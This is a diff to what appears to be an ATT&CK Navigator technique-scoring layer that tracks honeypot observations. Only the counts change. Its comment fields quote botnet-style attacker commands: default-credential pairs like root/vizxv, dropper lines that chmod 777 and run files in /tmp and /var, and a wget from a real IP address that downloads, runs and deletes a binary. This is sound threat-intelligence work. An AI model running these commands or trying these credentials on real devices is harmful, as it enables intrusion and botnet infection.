@@ -10,19 +10,19 @@
   "techniques": [
     {
       "techniqueID": "T1059.004",
-      "score": 1639,
+      "score": 1659,
       "comment": "shell; sh",
       "enabled": true
     },
     {
       "techniqueID": "T1110.001",
-      "score": 1055,
+      "score": 1065,
       "comment": "enable\\x00 / linuxshell\\x00; root / vizxv",
       "enabled": true
     },
     {
       "techniqueID": "T1222.002",
-      "score": 66,
+      "score": 67,
       "comment": ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/; >/var/d && chmod 777 /var/d && /var/d && cd /var/",
       "enabled": true
     },
@@ -34,13 +34,13 @@
     },
     {
       "techniqueID": "T1083",
-      "score": 30,
+      "score": 31,
       "comment": "cd /proc && cat self/cmdline; cat /proc/mounts; echo -e \"\\x47\\x41\\x59\"",
       "enabled": true
     },
     {
       "techniqueID": "T1070.004",
-      "score": 28,
+      "score": 29,
       "comment": "rm /dev/.t; rm /dev/.sh; rm /dev/.human; (wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
       "enabled": true
     },
@@ -70,6 +70,6 @@
       "#ff5d73"
     ],
     "minValue": 0,
-    "maxValue": 1639
+    "maxValue": 1659
   }
 }
